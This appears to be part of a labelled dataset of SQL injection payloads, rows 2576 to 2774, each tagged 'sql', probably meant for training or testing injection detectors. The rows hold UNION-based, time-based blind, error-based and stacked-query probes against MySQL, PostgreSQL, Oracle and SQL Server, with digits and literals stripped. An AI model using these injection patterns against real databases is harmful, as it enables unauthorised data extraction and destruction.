2576,sql,". . / / / / ? = & = & =   ' ) UNION ALL SELECT NULL , NULL , NULL , NULL # "
2577,sql,". . / / / ? = & = & = & =   ) ) AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( ( = "
2578,sql,". . / / / ? = & = & = & =  - ' ) ) ) UNION ALL SELECT , , # "
2579,sql,". . ? =  - % ' ) UNION ALL SELECT , , # "
2580,sql,". . / / / / ? = & = & =   "" AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) AND " zrDj " LIKE " "
2581,sql,". . . / / ? = & = & =   ' ) ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ( ( ' dIWO ' = ' "
2582,sql,". . . . / / ? = & =   ' , ( BEGIN IF ( = ) THEN DBMS_LOCK . SLEEP ( ) ; ELSE DBMS_LOCK . SLEEP ( ) ; END IF ; END ; )  -- "
2583,sql,". . ? =  - ) ) ) UNION ALL SELECT , , , , ,  -- "
2584,sql,". . / ? = & = & = & =   ) ) ) RLIKE ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) Irzi ) AND ( ( ( = "
2585,sql,". . . . / / / ? = & = & = & =   ' ) ORDER BY # "
2586,sql,". . . . / / / ? =   "" ) ) AND = # "
2587,sql,". . . . / / ? =  - % ' UNION ALL SELECT , , , , , # "
2588,sql,". . . / / ? = & = & = & =  - ' UNION ALL SELECT , , , , , , , , ,  -- "
2589,sql,". . . . / / / / ? =   ' ) ) ORDER BY  -- "
2590,sql,". . ? = & = & =   % ' AND = # "
2591,sql,". . . . / / ? = & = & = & =   ' ) ) AND ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x ) AND ( ( ' llWO ' LIKE ' "
2592,sql,". . . ? = & = & =   ' ) ) ) ORDER BY # "
2593,sql,". . / / / ? = & = & = & =   ' ; IF ( = ) SELECT  ELSE DROP FUNCTION MWOi --"
2594,sql,". . . . ? = & = & = & =   ) ; SELECT SLEEP ( )  -- "
2595,sql,". . . / / / / ? =   "" AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) pjBf ) # "
2596,sql,". . . / / ? = & =   ' ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ( ' ZipV ' LIKE ' "
2597,sql,". . . . ? = & = & =   ' ) ) ) ; IF ( = ) SELECT  ELSE DROP FUNCTION rPWm --"
2598,sql,". . . ? = & = & =   ' ) RLIKE SLEEP ( ) AND ( ' sdtu ' = ' "
2599,sql,". . . / / ? = & =  - % ' UNION ALL SELECT , , , , , , ,  -- "
2600,sql,". . / / ? = & = & =   ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL -- "
2601,sql,". . / / / ? = & =   ' ) ) ) AND MAKE_SET ( = , ) AND ( ( ( ' lyYJ ' = ' "
2602,sql,". . / ? =   ' ) AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) AND ( ' Vppe ' = ' "
2603,sql,". . . / / / / ? = & = & = & =  - % "" UNION ALL SELECT ,  -- "
2604,sql,". . . . / / / ? =   "" AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND " nAky " = " "
2605,sql,". . . . / / / / ? = & = & =  - ' ) ) UNION ALL SELECT , , , , , ,  -- "
2606,sql,". . . / ? = & =   ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL # "
2607,sql,". . . / ? = & = & = & =  - "" UNION ALL SELECT , , , ,  -- "
2608,sql,". . / ? =   ' ) ) UNION ALL SELECT NULL , NULL , NULL -- "
2609,sql,". . . . / ? = & = & =   ' ; SELECT PG_SLEEP ( )  --"
2610,sql,". . . / ? = & = & = & =   % ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL -- "
2611,sql,". . . . / ? =  - UNION ALL SELECT , , , , , , ,  -- "
2612,sql,". . / / ? = & = & =   ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) ) "
2613,sql,". . . / / / ? =   ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2614,sql,". . . . / ? =   "" ) AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND ( " PYwo " = " "
2615,sql,". . . / / ? =   ' AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ' MQHz ' = ' "
2616,sql,". . . ? = & = & = & =   % ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2617,sql,". . ? =  - ' UNION ALL SELECT # "
2618,sql,". . . / ? = & = & = & =   ' ) ) ) UNION ALL SELECT NULL # "
2619,sql,". . . . ? = & = & = & =   % ' ) ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ( ( ' % ' = ' "
2620,sql,". . ? = & = & = & =   ' ) AND ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x ) AND ( ' kIwp ' LIKE ' "
2621,sql,". . / / / / ? = & = & = & =   ' ) WAITFOR DELAY ' : : ' AND ( ' ZpSW ' = ' "
2622,sql,". . / / / ? = & =    UNION ALL SELECT NULL , NULL , NULL , NULL , NULL # "
2623,sql,". . . / / / / ? = & =  - ) UNION ALL SELECT , , , , , # "
2624,sql,". . . . / ? =   % "" AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND " % " = " "
2625,sql,". . / / / ? = & = & =   ' ) AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND ( ' QVkS ' LIKE ' "
2626,sql,". . . / / ? = & =   UNION ALL SELECT NULL , NULL , NULL , NULL -- "
2627,sql,". . . / / / ? =   ( SELECT ( CASE WHEN ( = ) THEN  ELSE CAST ( AS INT ) / ( SELECT  FROM DUAL ) END ) FROM DUAL ) "
2628,sql,". . . . / / / ? = & =   % "" AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND " % " = " "
2629,sql,". . . . / / / ? = & =   ' ) ) AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) AND ( ( ' qLFk ' = ' "
2630,sql,". . / / ? = & = & =   UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2631,sql,". . . . / ? = & = & =   ) ) ) UNION ALL SELECT NULL , NULL , NULL , NULL -- "
2632,sql,". . ? =   ) ) ) RLIKE SLEEP ( ) AND ( ( ( = "
2633,sql,". . / / ? = & =   ' AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ' Bcji ' = ' "
2634,sql,". . . . / / ? =  - UNION ALL SELECT , , , , , , , , ,  -- "
2635,sql,". . . / / / ? =   ) ) ) AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) AND ( ( ( = "
2636,sql,". . / / / ? = & = & =   "" ) AND =  -- "
2637,sql,". . ? = & = & = & =   ) ; SELECT PG_SLEEP ( )  --"
2638,sql,". . . / / ? = & =  - ' ) UNION ALL SELECT , , , , , , , ,  -- "
2639,sql,". . . . / / ? =   ' ) ) UNION ALL SELECT NULL , NULL -- "
2640,sql,". . . . / ? =   "" AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND " zzkl " = " "
2641,sql,". . . / / / / ? = & = & = & =  - "" UNION ALL SELECT , , , , , # "
2642,sql,". . / / / / ? = & =   "" AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) AND " KUhQ " LIKE " "
2643,sql,". . . / / / ? = & = & =   AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , )  -- "
2644,sql,". . . . / / ? = & =  - "" ) UNION ALL SELECT # "
2645,sql,". . / / ? = & = & = & =   "" ) AND =  -- "
2646,sql,". . . . / / / ? = & =   % ' AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ' % ' = ' "
2647,sql,". . . / / ? = & =  - ' ) ) UNION ALL SELECT , , , , , ,  -- "
2648,sql,". . . . / ? =   ' AND MAKE_SET ( = , )  -- "
2649,sql,". . . / ? = & =   "" RLIKE ( SELECT ( CASE WHEN ( = ) THEN  ELSE x END ) ) AND " jaOJ " = " "
2650,sql,". . . / / / / ? =  - ' UNION ALL SELECT , , , , , # "
2651,sql,". . . / ? = & =  - "" ) UNION ALL SELECT ,  -- "
2652,sql,". . . / / ? = & = & = & =   "" AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND " Djfs " = " "
2653,sql,". . . ? = & = & = & =   ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) "
2654,sql,". . . . / ? =   ) ) ; SELECT PG_SLEEP ( )  --"
2655,sql,". . . / / / ? =  - ' UNION ALL SELECT , , , , , , # "
2656,sql,". . . ? = & = & =   "" RLIKE SLEEP ( ) AND " imZi " LIKE " "
2657,sql,". . . . / ? = & =   ) ) ) AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ( ( ( = "
2658,sql,". . . . ? = & = & = & =   ' ) ) RLIKE ( SELECT ( CASE WHEN ( = ) THEN xcdfeecaffcdef ELSE x END ) ) AND ( ( ' Rcvj ' LIKE ' "
2659,sql,". . . . / / ? = & =  - ' ) UNION ALL SELECT , # "
2660,sql,". . ? = & = & =   "" ) ) AND = CONVERT ( INT , ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( ( " wwCB " = " "
2661,sql,". . / / / ? =   "" ; SELECT SLEEP ( ) AND " AVBm " LIKE " "
2662,sql,". . . . / / / ? =   "" ORDER BY # "
2663,sql,". . . . / / / ? = & = & =   % ' AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ' % ' = ' "
2664,sql,". . / / / / ? = & = & =  - ' ) ) UNION ALL SELECT , , , , ,  -- "
2665,sql,". . . . / / / / ? =   ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2666,sql,". . . ? = & =   ' ) AND = % "
2667,sql,". . . . / / / / ? = & = & = & =   ' ) ; SELECT SLEEP ( ) # "
2668,sql,". . / / ? = & =   ( SELECT CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) FROM DUAL ) "
2669,sql,". . . . / / ? = & = & = & =   ' ) ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2670,sql,". . / / / / ? =   ' ) ) ) AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND ( ( ( ' PPDU ' = ' "
2671,sql,". . ? = & =   % ' ) ) ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
2672,sql,". . . ? = & =   , ( SELECT ( CASE WHEN ( = ) THEN SLEEP ( ) ELSE  END ) ) "
2673,sql,". . . / ? = & = & = & =  - ) UNION ALL SELECT , , , , , , , , , # "
2674,sql,". . . ? = & = & = & =   ) ) AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND ( ( = "
2675,sql,". . / / / ? = & = & =  - % ' ORDER BY # "
2676,sql,". . . / / / / ? = & =   "" ) AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ( " PlEU " LIKE " "
2677,sql,". . . / / ? = & = & = & =   ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2678,sql,". . / ? = & = & =   % ' ; SELECT PG_SLEEP ( )  --"
2679,sql,". . . / / ? = & = & = & =  - ' ) ) UNION ALL SELECT , , , , , , , , , # "
2680,sql,". . / / / / ? = & = & = & =   ' ) ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ( ( ' RTtj ' LIKE ' "
2681,sql,". . . . ? =   ' PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , )  -- "
2682,sql,". . . . / / / / ? = & = & = & =   ' , ( SELECT ( CASE WHEN ( = ) THEN xcdfeecaffcdef ELSE * ( SELECT  FROM INFORMATION_SCHEMA . PLUGINS ) END ) )  -- "
2683,sql,". . / ? = & = & =  - "" ) UNION ALL SELECT # "
2684,sql,". . . / ? =   ) ) AND = # "
2685,sql,". . . / / / ? = & = & = & =   "" ) AND MAKE_SET ( = , ) AND ( " szKG " LIKE " "
2686,sql,". . / ? = & = & =   % ' AND MAKE_SET ( = , ) AND ' % ' = ' "
2687,sql,". . . . / / ? =  - ) ) ORDER BY  -- "
2688,sql,". . . . / / / ? = & =   ' ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ( ' AJjp ' = ' "
2689,sql,". . . . ? =   ' ) ) RLIKE ( SELECT ( CASE WHEN ( = ) THEN xcdfeecaffcdef ELSE x END ) ) AND ( ( ' OIZM ' = ' "
2690,sql,". . . ? =   "" ORDER BY # "
2691,sql,". . / / / ? = & = & =   ) ) AND = AND ( ( = "
2692,sql,". . . . ? = & = & = & =   AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL # "
2693,sql,". . ? =   ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2694,sql,". . . . / / ? = & =   ) ) AND = # "
2695,sql,". . / / / / ? = & =   ' ) AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( ' WGym ' = ' "
2696,sql,". . / / ? = & = & = & =   AND =  -- "
2697,sql,". . . ? = & = & =   ' AND =  -- "
2698,sql,". . . / / / ? = & = & =  - ' UNION ALL SELECT , , , , # "
2699,sql,". . / ? =   % ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2700,sql,". . . . ? = & = & = & =   ' ; WAITFOR DELAY ' : : '  --"
2701,sql,". . / / / ? = & = & = & =   ' WAITFOR DELAY ' : : ' AND ' hQfW ' LIKE ' "
2702,sql,". . . . / ? = & =   ) PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , )  -- "
2703,sql,". . . / / ? =   % "" AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) AND " % " = " "
2704,sql,". . / / ? = & = & = & =   % ' ) AND = CONVERT ( INT , ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( ' % ' = ' "
2705,sql,". . . . / ? = & = & = & =   ' ) ) ORDER BY  -- "
2706,sql,". . . / ? = & =   ( SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END ) ) "
2707,sql,". . . . / / / / ? = & =  - "" UNION ALL SELECT , , , ,  -- "
2708,sql,". . . / / ? = & = & =    AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , )  -- "
2709,sql,". . ? = & = & = & =   "" ) AND =  -- "
2710,sql,". . . / ? =   ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2711,sql,". . . . / / ? = & =   ' RLIKE ( SELECT ( CASE WHEN ( = ) THEN xaffdedeafffe ELSE x END ) ) AND ' TmEQ ' LIKE ' "
2712,sql,". . ? = & =   % ' ) UNION ALL SELECT NULL , NULL -- "
2713,sql,". . / / / ? = & = & =   AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) # "
2714,sql,". . . / / ? =   ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL # "
2715,sql,". . . ? =   ' ) ; SELECT SLEEP ( ) AND ( ' fxQl ' LIKE ' "
2716,sql,". . . / / / ? =   AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL )  -- "
2717,sql,". . / / ? = & = & = & =   , ( BEGIN IF ( = ) THEN DBMS_LOCK . SLEEP ( ) ; ELSE DBMS_LOCK . SLEEP ( ) ; END IF ; END ; ) "
2718,sql,". . / / / / ? =  - UNION ALL SELECT , , , , , , , , # "
2719,sql,". . . . / / / / ? =   ) ) AND = # "
2720,sql,". . . / / / / ? = & =   ' AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) )  -- "
2721,sql,". . . / ? = & = & =  - UNION ALL SELECT , , , , # "
2722,sql,". . . . / / ? = & = & =   ) ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL -- "
2723,sql,". . . . / / / ? =  - UNION ALL SELECT , , , , , , , ,  -- "
2724,sql,". . / / / ? = & =   ' ; ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) Bcts ) # "
2725,sql,". . . . ? = & =    AND MAKE_SET ( = , ) "
2726,sql,". . / ? = & = & = & =  - ' ) ORDER BY # "
2727,sql,". . . ? =   ' ) ) AND MAKE_SET ( = , ) AND ( ( ' Ijtf ' = ' "
2728,sql,". . . . / / / ? = & = & =   "" AND = AND " phnm " LIKE " "
2729,sql,". . . . ? = & = & = & =   % ' AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ' % ' = ' "
2730,sql,". . / ? =    UNION ALL SELECT NULL , NULL , NULL , NULL , NULL # "
2731,sql,". . . / ? =   "" UNION ALL SELECT NULL , NULL , NULL , NULL # "
2732,sql,". . . / / ? = & = & = & =   % ' PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND ' % ' = ' "
2733,sql,". . . / / / ? = & = & =    AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) # "
2734,sql,". . . . / / ? = & = & =   ) AND SLEEP ( )  -- "
2735,sql,". . . / / / ? =   ) ) ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
2736,sql,". . / / / / ? = & =   "" ) ) AND =  -- "
2737,sql,". . . / / ? = & =   % "" AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND " % " = " "
2738,sql,". . . . / ? = & =   % ' ) AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) AND ( ' % ' = ' "
2739,sql,". . / / / / ? = & = & = & =   % "" UNION ALL SELECT NULL , NULL , NULL -- "
2740,sql,". . / ? = & = & = & =  - ' UNION ALL SELECT , ,  -- "
2741,sql,". . . . / / / ? = & = & = & =   % "" ; IF ( = ) SELECT  ELSE DROP FUNCTION rPWm --"
2742,sql,". . ? = & = & = & =  - "" ) UNION ALL SELECT , , ,  -- "
2743,sql,". . . . / / / / ? = & = & =   ' ) ) AND = # "
2744,sql,". . . ? =  - ' ) ) ORDER BY # "
2745,sql,". . . / ? =   "" ) AND =  -- "
2746,sql,". . / ? = & = & = & =   ' ) ) PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND ( ( ' CLdO ' = ' "
2747,sql,". . / / / ? = & = & =   ' AND SLEEP ( ) AND ' mfHr ' = ' "
2748,sql,". . . / ? =    AND =  -- "
2749,sql,". . . . ? =   ' ) ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ( ( ' DCWR ' = ' "
2750,sql,". . . . / / ? =   ) ) ) AND SLEEP ( ) AND ( ( ( = "
2751,sql,". . . / / / ? = & = & =   ' ; SELECT SLEEP ( ) AND ' dHOM ' LIKE ' "
2752,sql,". . . / / / / ? = & =   % ' RLIKE ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) UfpP ) AND ' % ' = ' "
2753,sql,". . . / / / ? =   % ' UNION ALL SELECT NULL -- "
2754,sql,". . / ? =  - "" ) UNION ALL SELECT # "
2755,sql,". . . . ? = & = & = & =  - ' UNION ALL SELECT , , , , ,  -- "
2756,sql,". . . / / ? =   % "" AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) AND " % " = " "
2757,sql,". . . . / / / / ? =   % ' ) ) AND =  -- "
2758,sql,". . . . / / / ? =   "" ; WAITFOR DELAY ' : : '  --"
2759,sql,". . . . / / / ? = & =   % "" AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND " % " = " "
2760,sql,". . / / / / ? = & = & =   ) ) ; WAITFOR DELAY ' : : '  --"
2761,sql,". . . / ? = & = & = & =   ' ) UNION ALL SELECT NULL , NULL # "
2762,sql,". . / / / / ? = & = & = & =  - ) UNION ALL SELECT # "
2763,sql,". . / ? = & = & =   ( SELECT ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  FROM INFORMATION_SCHEMA . PLUGINS ) END ) ) "
2764,sql,". . . . / / / ? = & = & =   ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2765,sql,". . . . ? =   AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS "
2766,sql,". . . / / / / ? = & = & =   ) AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) )  -- "
2767,sql,". . / ? = & = & =   % ' ) AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND ( ' % ' = ' "
2768,sql,". . ? = & = & = & =   "" UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL -- "
2769,sql,". . . . / ? = & = & = & =   ' UNION ALL SELECT NULL , NULL -- "
2770,sql,". . ? = & =   ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2771,sql,". . / / / ? =   % ' ) AND = # "
2772,sql,". . . . / ? = & =   ' AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC )  -- "
2773,sql,". . . . ? = & =   ) ) AND =  -- "
2774,sql,". . . / ? =   % "" RLIKE ( SELECT ( CASE WHEN ( = ) THEN  ELSE x END ) ) AND " % " = " "
